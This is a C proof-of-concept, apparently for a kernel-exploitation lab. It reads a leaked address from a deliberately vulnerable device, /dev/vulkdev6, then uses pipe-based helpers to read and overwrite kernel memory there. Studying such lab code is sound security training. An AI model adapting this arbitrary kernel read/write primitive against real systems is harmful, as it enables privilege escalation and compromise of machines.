#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

ssize_t kernel_read(void *kaddr, void *ubuf, size_t count)
{
	int pipefd[2];
	ssize_t len;

	if (pipe(pipefd)) {
		printf("pipe error\n");
		return -1;
	}
	len = write(pipefd[1], kaddr, count);

	if (len != count) {
		printf("pipe read kaddr=%p, len=%d, err=%d\n",
			kaddr, len, errno);
		return -1;
	}
	len = read(pipefd[0], ubuf, count);
	if (len != count) {
		printf("pipe read  ubuf=%p, len=%d, err=%d\n",
			ubuf, len, errno);
		return -1;
	}
	close(pipefd[0]);
	close(pipefd[1]);
	return len;
}

ssize_t kernel_write(void *kaddr, void *ubuf, size_t count)
{
	int pipefd[2];
	ssize_t len;

	if (pipe(pipefd)) {
		printf("pipe error\n");
		return -1;
	}
	len = write(pipefd[1], ubuf, count);

	if (len != count) {
		printf("pipe write ubuf=%p, len=%d, err=%d\n",
			ubuf, len, errno);
		return -1;
	}
	len = read(pipefd[0], kaddr, count);
	if (len != count) {
		printf("pipe write kaddr=%p len=%d, err=%d\n",
			kaddr, len, errno);
		return  -1;
	}

	close(pipefd[0]);
	close(pipefd[1]);
	return len;
}

int main(int argc, char *argv[])
{
	int fd, ret;
	unsigned long *addr;
	unsigned long secret = 0;
	char buf[256];

	fd = open("/dev/vulkdev6", O_RDONLY);
	if (fd < 0) {
		printf("open error\n");
		return 0;
	}

	ret = read(fd, buf, sizeof(buf));
	if (ret < 0) {
		printf("read device error\n");
		close(fd);
		return 0;
	}
	printf("info: %s\n", buf);
	sscanf(buf, "secret=(%lx)", (unsigned long *)&addr);
	printf("secret at %p\n", addr);
	ret = kernel_read(addr, &secret, sizeof(secret));
	if (ret <= 0) {
		printf("kernel read error\n");
		close(fd);
		return 0;
	}
	printf("kernel read result: %lx\n", secret);

	secret = 0xc0debeef;
	ret = kernel_write(addr, &secret, sizeof(secret));
	if (ret <= 0) {
		printf("kernel write error\n");
		close(fd);
	}

	ret = kernel_read(addr, &secret, sizeof(secret));
	if (ret <= 0) {
		printf("kernel read error\n");
		close(fd);
		return 0;
	}
	printf("kernel read result: %lx\n", secret);
	close(fd);
	return 0;
}
